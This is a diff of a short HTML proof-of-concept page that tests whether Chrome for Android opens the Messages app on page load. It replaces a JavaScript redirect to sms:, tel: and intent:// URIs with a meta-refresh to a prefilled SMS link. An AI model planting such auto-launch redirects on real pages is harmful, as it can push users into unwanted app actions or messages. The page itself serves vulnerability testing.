@@ -1,20 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Android Intent Auto Launch PoC</title>
+  <title>Android Chrome SMS Auto Launch PoC</title>
+
+  <!-- Auto-redirect on page load -->
+  <meta http-equiv="refresh"
+        content="0;url=sms:15551234567?body=Security%20Alert">
+
 </head>
 <body>
-  <h1>Android Intent Auto Launch Test</h1>
-  <p>If an app opens automatically, this is a security issue.</p>
-
-  <script>
-    // Example: SMS app
-    window.location.href = "sms:12345?body=PoC";
-
-    // Alternative examples (test one at a time):
-    // window.location.href = "tel:12345";
-    // window.location.href = "intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end";
-    // window.location.href = "intent://#Intent;component=com.android.messaging/.ui.conversationlist.ConversationListActivity;end";
-  </script>
+  <h1>SMS Auto Launch PoC</h1>
+  <p>
+    If the Messages app opens automatically with a pre-filled SMS body
+    <strong>without any user interaction</strong>,
+    this confirms a Chrome for Android vulnerability.
+  </p>
 </body>
 </html>
